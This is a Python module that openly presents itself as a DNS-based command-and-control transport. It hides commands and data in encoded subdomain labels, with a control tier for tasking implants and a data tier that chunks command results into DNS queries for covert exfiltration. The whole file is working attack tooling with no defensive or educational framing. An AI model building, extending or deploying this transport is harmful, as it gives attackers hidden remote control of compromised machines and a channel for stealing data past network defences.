#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""DNS dual-tier C2 transport (control channel vs data channel)."""

from __future__ import annotations

import base64
import json
from typing import Dict, List, Optional


PROTOCOL_VERSION = 1
TIER_CONTROL = "control"
TIER_DATA = "data"
LABEL_PREFIX = "ks"
DEFAULT_LABEL_LIMIT = 63


def encode_subdomain_payload(data: bytes, *, prefix: str = LABEL_PREFIX) -> List[str]:
    blob = base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")
    labels = [prefix, f"v{PROTOCOL_VERSION}"]
    while blob:
        labels.append(blob[:DEFAULT_LABEL_LIMIT])
        blob = blob[DEFAULT_LABEL_LIMIT:]
    return labels


def decode_subdomain_payload(labels: List[str], *, prefix: str = LABEL_PREFIX) -> Optional[bytes]:
    tokens = [str(x or "").strip() for x in labels if str(x or "").strip()]
    if len(tokens) < 3 or tokens[0] != prefix:
        return None
    body = "".join(tokens[2:])
    pad = "=" * ((4 - len(body) % 4) % 4)
    try:
        return base64.urlsafe_b64decode(body + pad)
    except Exception:
        return None


def build_dual_tier_qname(
    tier: str,
    action: str,
    client_id: str,
    domain: str,
    *,
    payload: bytes = b"",
) -> str:
    """Build qname: ks.v1.<tier>.<action>.[chunk...].<client_id>.<domain>"""
    dom = str(domain or "c2.local").strip().rstrip(".")
    cid = str(client_id or "dns1").strip()
    act = str(action or "poll").strip().lower()
    tier_token = TIER_DATA if str(tier).lower() == TIER_DATA else TIER_CONTROL
    labels = [LABEL_PREFIX, f"v{PROTOCOL_VERSION}", tier_token, act]
    if payload:
        labels.extend(encode_subdomain_payload(payload)[2:])
    labels.append(cid)
    labels.append(dom)
    return ".".join(labels)


def parse_dual_tier_qname(qname: str, domain: str) -> Optional[Dict[str, str]]:
    """Parse ks.v1.control|data.* queries. Returns dict with tier, action, client_id, payload."""
    dom = str(domain or "c2.local").strip().rstrip(".").lower()
    name = str(qname or "").strip().rstrip(".").lower()
    if name.endswith("." + dom):
        name = name[: -(len(dom) + 1)]
    elif name.endswith(dom):
        name = name[: -len(dom)].rstrip(".")
    labels = [p for p in name.split(".") if p]
    if len(labels) < 5 or labels[0] != LABEL_PREFIX:
        return None
    if labels[1] != f"v{PROTOCOL_VERSION}":
        return None
    tier = labels[2]
    if tier not in (TIER_CONTROL, TIER_DATA):
        return None
    action = labels[3]
    cid = labels[-1]
    chunk_labels = labels[4:-1]
    payload = ""
    if tier == TIER_DATA and action == "result" and chunk_labels:
        payload = chunk_labels[0] if len(chunk_labels) == 1 else "".join(chunk_labels)
    else:
        raw = decode_subdomain_payload([LABEL_PREFIX, labels[1]] + chunk_labels) or b""
        payload = raw.decode("utf-8", errors="replace")
    return {
        "tier": tier,
        "action": action,
        "client_id": cid,
        "payload": payload,
        "payload_b64": base64.b64encode(payload.encode("utf-8", errors="replace")).decode("ascii") if payload else "",
    }


def wrap_control_command(command: str) -> str:
    return base64.b64encode(str(command or "").encode("utf-8", errors="replace")).decode("ascii")


def unwrap_control_command(txt: str) -> str:
    raw = str(txt or "").strip()
    if not raw or raw.lower() == "wait":
        return ""
    try:
        return base64.b64decode(raw).decode("utf-8", errors="replace")
    except Exception:
        return raw


def build_data_result_chunks(text: str, *, chunk_label_chars: int = 50) -> List[str]:
    raw = str(text or "").encode("utf-8", errors="replace")
    enc = base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")
    size = max(16, min(int(chunk_label_chars or 50), 62))
    return [enc[i : i + size] for i in range(0, len(enc) or 1, size)] or ["AA"]


def parse_dns_response(raw: bytes) -> Dict[str, bytes]:
    return {"payload": raw or b"", "protocol_version": PROTOCOL_VERSION}


def build_typed_task_envelope(task: Dict[str, object]) -> bytes:
    return json.dumps({"protocol_version": PROTOCOL_VERSION, "task": task}, separators=(",", ":")).encode("utf-8")
